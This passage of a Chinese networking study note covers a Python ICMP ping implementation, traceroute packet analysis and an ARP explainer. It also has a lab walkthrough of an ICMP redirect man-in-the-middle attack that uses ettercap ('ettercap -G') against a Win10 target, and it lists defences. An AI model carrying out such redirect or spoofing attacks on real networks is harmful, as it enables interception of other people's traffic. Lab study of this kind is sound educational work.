class="cm-operator">**</span> <span class="cm-number">4</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">94</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment"># 若为ip，不变；若为域名，转为ip</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">95</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">try</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">96</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">dst_addr</span> = <span class="cm-variable">socket</span>.<span class="cm-property">gethostbyname</span>(<span class="cm-variable">host</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">97</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">except</span> <span class="cm-variable">socket</span>.<span class="cm-property">gaierror</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">98</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin">print</span>(<span class="cm-string">f'something wrong, please check your input.'</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">99</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">exit</span>(<span class="cm-number">0</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">100</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">miss</span>, <span class="cm-variable">short</span>, <span class="cm-variable">long</span>, <span class="cm-variable">alltime</span> = <span class="cm-number">0</span>, <span class="cm-number">10</span> <span class="cm-operator">**</span> <span class="cm-number">9</span>, <span class="cm-number">0</span>, []</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">101</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-builtin">print</span>(<span class="cm-string">f"正在 Ping {host} [{dst_addr}] 具有 32 字节的数据:"</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">102</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">for</span> <span class="cm-variable">i</span> <span class="cm-keyword">in</span> <span class="cm-builtin">range</span>(<span class="cm-number">0</span>, <span class="cm-number">4</span>):</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">103</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment"># 构造icmp数据包</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">104</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">icmp_pkt</span> = <span class="cm-variable">icmp_packet</span>(<span class="cm-variable">Sequence_number</span> <span class="cm-operator">+</span> <span class="cm-variable">i</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">105</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment"># print(icmp_pkt)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">106</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment"># 发送并记录时间</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">107</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">icmp_socket</span>, <span class="cm-variable">send_time</span> = <span class="cm-variable">icmp_request</span>(<span class="cm-variable">dst_addr</span>, <span class="cm-variable">icmp_pkt</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">108</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment"># 接收并计算时间差</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">109</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">times</span>, <span class="cm-variable">TTL</span> = <span class="cm-variable">icmp_reply</span>(<span class="cm-variable">icmp_socket</span>, <span class="cm-variable">send_time</span>, <span class="cm-variable">Sequence_number</span> <span class="cm-operator">+</span> <span class="cm-variable">i</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">110</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> <span class="cm-variable">times</span> <span class="cm-operator">&gt;</span>= <span class="cm-number">0</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">111</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin">print</span>(<span class="cm-string">f"来自 {dst_addr} 的回复: 字节=32 时间={int(times * 1000)}ms TTL={TTL}"</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">112</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> <span class="cm-variable">short</span> <span class="cm-operator">&gt;</span> <span class="cm-variable">times</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">113</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">short</span> = <span class="cm-variable">times</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">114</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> <span class="cm-variable">long</span> <span class="cm-operator">&lt;</span> <span class="cm-variable">times</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">115</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">long</span> = <span class="cm-variable">times</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">116</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">alltime</span>.<span class="cm-property">append</span>(<span class="cm-variable">times</span> <span class="cm-operator">*</span> <span class="cm-number">1000</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">117</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">time</span>.<span class="cm-property">sleep</span>(<span class="cm-number">1</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">118</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">else</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">119</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin">print</span>(<span class="cm-string">"请求超时。"</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">120</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">miss</span> += <span class="cm-number">1</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">121</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-builtin">print</span>()</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">122</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-builtin">print</span>(<span class="cm-string">f'{dst_addr} 的 Ping 统计信息:\n'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">123</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">f' &nbsp;  数据包: 已发送 = 4，已接收 = {4 - miss}，丢失 = {miss} ({int(miss / 4 * 100)}% 丢失)，'</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">124</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">if</span> <span class="cm-variable">miss</span> <span class="cm-operator">&lt;</span> <span class="cm-number">4</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">125</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin">print</span>(<span class="cm-string">'往返行程的估计时间(以毫秒为单位):\n'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">126</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-string">f' &nbsp;  最短 = {int(short * 1000)}ms，最长 = {int(long * 1000)}ms，平均 = {int(sum(alltime) / (4 - miss))}ms'</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">127</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-keyword">None</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">128</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">129</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">130</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">if</span> <span class="cm-variable">__name__</span> == <span class="cm-string">'__main__'</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 36px;">131</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">host</span> = <span class="cm-builtin">input</span>(<span class="cm-string">'please input domain name or ip addr:'</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -45px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 36px;">132</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">ping</span>(<span class="cm-variable">host</span>)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 3128px;"></div><div class="CodeMirror-gutters" style="height: 3128px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 44px;"></div></div></div></div></pre><p><span>结果如下：</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505204026533.png" referrerpolicy="no-referrer" alt="image-20220505204026533">
<span>主机A ping 主机B </span>—<span>&gt; 构建 ICMP 包 </span>––<span>&gt; 构建 IP 分组 </span>––<span>&gt; 解析硬件地址封装成帧 </span>––<span>&gt; 物理层发送 </span>––<span>&gt; 网络层传输 </span>––<span>&gt; 到达主机B </span>––<span>&gt; 提取IP数据包交给IP层协议 </span>––<span>&gt; 提取信息交给ICMP协议，构建ICMP应答包 </span>––<span>&gt; 发送给主机A</span></p><h5 id='traceroute'><span>Traceroute</span></h5><p><span>这是UNIX系统的名字，在Windows中是</span><strong><span>tracert</span></strong><span>。</span></p><p><span>一个分组从源点到终点的路，使用了ICMP时间超过差错报告报文。</span></p><h6 id='抓包-2'><span>抓包</span></h6><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505230528661.png" referrerpolicy="no-referrer" alt="image-20220505230528661"></p><p><span>（tracert 百度抓包）</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505231017646.png" referrerpolicy="no-referrer" alt="image-20220505231017646">
<span> 类型：11(0b)，表示超时类型。</span>
<span>代码：0(00)。</span>
<span>校验和：f4ff，correct，校验正确。</span>
<span>Unused：00 00 00 00。</span>
<span>数据：剩下的部分。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505231329442.png" referrerpolicy="no-referrer" alt="image-20220505231329442"></p><p><span>类型：3(03)，表示终点不可达类型。</span>
<span>代码：3(03)，表示终点不可达中的端口不可达类型。</span>
<span>校验和：b9 dd，correct，校验正确。</span>
<span>Unused：00 00 00 00。</span>
<span>数据：剩下的部分。</span>
<span>Traceroute从源主机向目的主机发送一连串的IP数据报，封装的是无法交付的UDP数据报（端口大于30000)。第一个数据报P1的生存时间TTL设置为1。当P1到达路径上的第一个路由器R1时，路由器R1先收下它，接着把TTL的值减1。由于</span><strong><span>TTL等于零了</span></strong><span>，R1就把P1丢弃了，并向源主机发送一个</span><strong><span>ICMP时间超过差错报告</span></strong><span>报文，源主机接着发送第二个数据报P2，并把TTL设置为2。P2先到达路由器R1，R1收下后把TTL减1再转发给路由器R2。R2收到P2时TTL为1，但减1后TTL变为零了。R2就丢弃P2，并向源主机发送一个ICMP时间超过差错报告报文。这样一直继续下去。当最后一个数据报刚刚到达目的主机时，数据报的TTL是1。主机不转发数据报，也不把TTL值减1。但因IP数据报中封装的是</span><strong><span>无法交付</span></strong><span>的UDP数据报，因此目的主机要向源主机发送</span><strong><span>ICMP终点不可达</span></strong><span>差错报告报文。这样，源主机达到了自己的目的，因为这些路由器和最后目的主机发来的ICMP报文正好给出了源主机想知道的路由信息一到达目的主机所经过的路由器的IP地址，以及到达其中的每一个路由器的往返时间。</span></p><h5 id='icmp重定向攻击'><span>ICMP重定向攻击</span></h5><h6 id='原理-1'><span>原理</span></h6><p><span>ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息(上面提到，type=5)时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让</span><strong><span>该主机按照黑客的要求来修改路由表。</span></strong></p><h6 id='攻击-1'><span>攻击</span></h6><p><strong><span>攻击机</span></strong></p><p><span>操作系统：kali</span></p><p><span>使用软件：netwox</span></p><p><span>IP:10.28.214.132</span></p><p><strong><span>靶机</span></strong></p><p><span>操作系统：Win10</span></p><p><span>IP:10.28..214.51</span></p><p><span>网关：10.28.128.1</span></p><p><strong><span>靶机Ping网关与攻击机</span></strong></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505233004181.png" referrerpolicy="no-referrer" alt="image-20220505233004181"></p><p><span>攻击机攻击</span></p><p><span>打开ettercap，点击对勾</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="shell"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="shell"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>1</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ettercap <span class="cm-attribute">-G</span> &nbsp;<span class="cm-comment">#打开ettercap</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="height: 23px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505234736263.png" referrerpolicy="no-referrer" alt="image-20220505234736263"></p><p><span>点击搜索主机，打开主机列表</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505234852997.png" referrerpolicy="no-referrer" alt="image-20220505234852997"></p><p><span>选择ICMP重定向攻击</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505234910519.png" referrerpolicy="no-referrer" alt="image-20220505234910519"></p><p><span>输入网关MAC地址和IP地址</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505234925642.png" referrerpolicy="no-referrer" alt="image-20220505234925642"></p><p><span>打开wireshark抓包，靶机浏览器打开几个网页。可以看到ICMP重定向报文。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505234940999.png" referrerpolicy="no-referrer" alt="image-20220505234940999"></p><p><span>点击可查看，网关已被修改为攻击机IP。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505235014982.png" referrerpolicy="no-referrer" alt="image-20220505235014982"></p><p><span>Ettercap显示靶机在访问的外网站点IP及端口。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220505235044426.png" referrerpolicy="no-referrer" alt="image-20220505235044426"></p><p><span> 攻击机可以获得靶机发送的数据，但是无法接收从外网返回的数据，属于</span><strong><span>半个中间人攻击。</span></strong></p><h6 id='防御-1'><span>防御</span></h6><p><span>（1）网关端：</span></p><p><span>关闭ICMP重定向（no ip redirects）。</span></p><p><span>变长子网掩码划分网段。</span></p><p><span>使用网络控制列表（ACL）和代理。</span></p><p><span>（2）主机端：</span></p><p><span>可以使用防火墙等过滤掉ICMP报文，或使用反间谍软件监控。</span></p><p><span>结合防ARP、IP欺骗等进行防御。 </span></p><h3 id='参考-2'><span>参考</span></h3><p><span>《TCP/IP详解卷1》第六、七、八章</span></p><p><span>《谢希仁 计算机网络第7版》4.4</span></p><p><a href='https://stackoverflow.com/questions/20905770/checksum-icmp-python-with-wireshark'><span>stackoverflow-checksum-icmp-python-with-wireshark</span></a></p><p><a href='https://datatracker.ietf.org/doc/rfc792/'><span>RFC 792</span></a></p><p><a href='https://www.youtube.com/channel/UCVYP1AeH9G1E1rtllwxLEQA'><span>ettercap的YouTube频道</span></a></p><p><a href='https://github.com/Ettercap/ettercap'><span>ettercap的GitHub</span></a></p><p>&nbsp;</p><h2 id='arp协议详解与arp欺骗中毒）攻击实战'><span>ARP协议详解与ARP欺骗（中毒）攻击实战</span></h2><h3 id='简介-4'><span>简介</span></h3><p><span>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址（MAC地址）的一个协议。划分到网络层（TCP/IP）或数据链路层（OSI），用在局域网内。</span></p><p><span>功能：完成主机或路由器</span><strong><span>IP地址到MAC地址的映射</span></strong><span>。</span></p><p><span>ARP高速缓存（arp表）：IP地址和MAC地址的映射。</span></p><p><span>注：网络设备的接口有MAC地址，并不是一个网络设备仅有一个MAC地址，二层交换机这种设备没有MAC地址。</span></p><h3 id='arp报文'><span>ARP报文</span></h3><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220506110742953.png" referrerpolicy="no-referrer" alt="image-20220506110742953"></p><p><span>ARP报文的</span><strong><span>总长度为64字节</span></strong><span>，FCS（Frame Check Sequence，帧校验序列），俗称帧尾，即数据链路层的协定数据单元（帧)的尾部栏位，是一段4个位元组的循环冗余校验码，用来验证帧在传输过程中的完整性。</span></p><p><strong><span>硬件类型</span></strong><span>：16位，2字节，用来定义运行ARP的网络类型。每个局域网基于其类型被指派一个整数。例如：以太网的类型为1。ARP可用在任何物理网络上。</span></p><p><strong><span>协议类型</span></strong><span>：16位，2字节，用来定义使用的协议。例如：对IPv4协议这个字段是0x0800。ARP可用于任何高层协议。</span></p><p><strong><span>硬件长度</span></strong><span>：8位，1字节，用来定义物理地址的长度，以字节为单位。例如：对于以太网的值为6。</span></p><p><strong><span>协议长度</span></strong><span>：8位，1字节，用来定义逻辑地址的长度，以字节为单位。例如：对于IPv4协议的值为4。</span></p><p><strong><span>操作码</span></strong><span>：16位，2字节，用来定义报文的类型。已定义的分组类型有两种：ARP请求（1），ARP响应（2）。</span></p><p><strong><span>源硬件地址</span></strong><span>：可变长度字段，单位字节，用来定义发送方的物理地址。例如：对于以太网这个字段的长度是6字节。</span></p><p><strong><span>源协议地址</span></strong><span>：可变长度字段，单位字节，用来定义发送方的逻辑（IP）地址。例如：对于IP协议这个字段的长度是4字节。</span></p><p><strong><span>目的硬件地址</span></strong><span>：可变长度字段，用来定义目标的物理地址，例如，对以太网来说这个字段位6字节。对于ARP请求报文，这个字段为全0，因为发送方并不知道目标的硬件地址。</span></p><p><strong><span>目的协议地址</span></strong><span>：可变长度字段，用来定义目标的逻辑（IP）地址，对于IPv4协议这个字段的长度为4个字节。</span></p><h3 id='arp流程'><span>ARP流程</span></h3><p><span>流程：</span><strong><span>检查ARP高速缓存</span></strong><span>，有对应表项则写入</span><strong><span>MAC帧</span></strong><span>，没有则用目的MAC地址为</span><strong><span>FF-FF FF-FF-FF-FF</span></strong><span>的帧封装并</span><strong><span>广播ARP请求分组，同一局域网</span></strong><span>中所有主机都能收到该请求。目的主机收到请求后就会向源主机</span><strong><span>单播一个ARP响应分组</span></strong><span>，源主机收到后将此映射</span><strong><span>写入ARP缓存</span></strong><span>（10-20min更新一次）。</span></p><h4 id='四种情况'><span>四种情况</span></h4><p><span>1.主机A发给本网络上的主机B：用ARP表找到主机B的硬件地址；</span>
<span>2.主机A发给另</span>–<span>网络上的主机B：用ARP表找到本网络上一个路由器（网关）的硬件地址；</span>
<span>3.路由器发给本网络的主机A：用ARP表找到主机A的硬件地址；</span>
